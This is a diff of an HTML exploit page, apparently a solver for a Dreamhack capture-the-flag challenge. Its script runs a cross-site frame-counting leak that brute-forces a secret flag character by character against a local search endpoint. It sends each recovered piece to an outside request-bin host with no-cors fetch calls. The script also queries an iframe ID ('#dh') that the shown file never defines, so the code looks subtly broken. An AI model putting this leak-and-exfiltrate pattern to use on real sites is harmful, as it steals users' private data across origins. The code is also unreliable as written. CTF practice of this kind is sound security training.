@@ -1,24 +1,53 @@
-<h2>Hello world</h2>
-<iframe id="iframe"></iframe>
-<img id="img" />
 <script>
-  const current_url = new URL(location.href);
-  const params = current_url.searchParams;
-//   const url = params.get('url');
-  // const url = 'http://host3.dreamhack.games:21203/';
-  const url = 'http://127.0.0.1:8000/';
-  const query = params.get('query');
-  const requestbin = params.get('requestbin') || 'https://mqzietu.request.dreamhack.games';
+  const url_request_bin = 'https://xgxtebe.request.dreamhack.games/';
+  const url_dh = 'http://localhost:8000/';
+  const iframe = document.querySelector('#dh');
+  const params = {};
+  document.location.search.split(/[?&]/).slice(1).forEach(s => {
+    const [a, b] = s.split('=');
+    params[a] = b;
+  });
 
-  console.log('url', url);
-  console.log('query', query);
-  console.log('requestbin', requestbin);
-  // fetch(`${requestbin}/ping/${query}`);
+  const verify_flag = async (s) => new Promise((resolve, reject) => {
+    iframe.src = `${url_dh}search?query=${s}`;
 
-  const elem_iframe = document.getElementById("iframe");
-  const elem_img = document.getElementById("img");
-  elem_iframe.src = url + '/search?query=' + query;
-  elem_iframe.onload = () => {
-    elem_img.src = `${requestbin}/${query}/${elem_iframe.contentWindow.frames.length}`;
-  };
-</script>
+    iframe.onload = () => {
+      const num_of_iframes = iframe.contentWindow.frames.length;
+      if (num_of_iframes > 0) {
+        resolve(true);
+      }
+      else {
+        resolve(false);
+      }
+    }
+  });
+
+  (async () => {
+    let flag = params['prefix'];
+    const chrs = '0123456789abcdef';
+    const l = "DH{12345678901234567890123456789012}".length;
+
+    fetch(url_request_bin+'START/'+flag, {mode: 'no-cors'});
+
+    while (flag.length < l) {
+      if (flag.length == l - 1) {
+        flag += '}';
+        break;
+      }
+      for (const c of chrs) {
+        if (await verify_flag(flag + c)) {
+          flag += c;
+          break;
+        }
+      }
+      fetch(url_request_bin+flag, {mode: 'no-cors'});
+    }
+
+    if (await verify_flag(flag)) {
+      fetch(url_request_bin+'FLAG/'+flag, {mode: 'no-cors'});
+    }
+    else {
+      fetch(url_request_bin+'SOMETHING_WRONG/'+flag, {mode: 'no-cors'});
+    }
+  })();
+</script>    
